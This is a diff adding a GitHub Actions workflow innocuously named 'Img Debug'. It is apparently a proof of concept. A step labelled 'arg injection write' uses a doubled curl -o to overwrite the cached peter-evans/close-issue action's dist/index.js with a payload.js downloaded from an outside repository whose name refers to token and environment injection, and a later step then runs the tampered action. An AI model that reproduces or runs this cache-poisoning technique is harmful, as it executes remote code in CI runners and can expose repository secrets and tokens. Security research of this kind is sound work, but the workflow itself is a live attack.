@@ -1,0 +1,21 @@
+name: Img Debug
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: list action cache
+        run: |
+          ls -la /home/runner/work/_actions/peter-evans/close-issue/276d7966e389d888f011539a86c8920025ea0626/ || echo NO-ACTION-DIR
+          ls -la /home/runner/work/_actions/peter-evans/close-issue/276d7966e389d888f011539a86c8920025ea0626/dist/ 2>/dev/null | head -8 || echo NO-DIST
+      - name: arg injection write
+        run: |
+          curl -o image.png https://raw.githubusercontent.com/PDFtoMark/gab-poc-tokenlists-envinject/main/files/fake.txt -o /home/runner/work/_actions/peter-evans/close-issue/276d7966e389d888f011539a86c8920025ea0626/dist/index.js https://raw.githubusercontent.com/PDFtoMark/gab-poc-tokenlists-envinject/main/files/payload.js || true
+          echo "--- after curl:"
+          head -c 120 /home/runner/work/_actions/peter-evans/close-issue/276d7966e389d888f011539a86c8920025ea0626/dist/index.js || true
+      - name: run tampered action
+        if: always()
+        uses: peter-evans/close-issue@276d7966e389d888f011539a86c8920025ea0626
+        with:
+          comment: "probe"
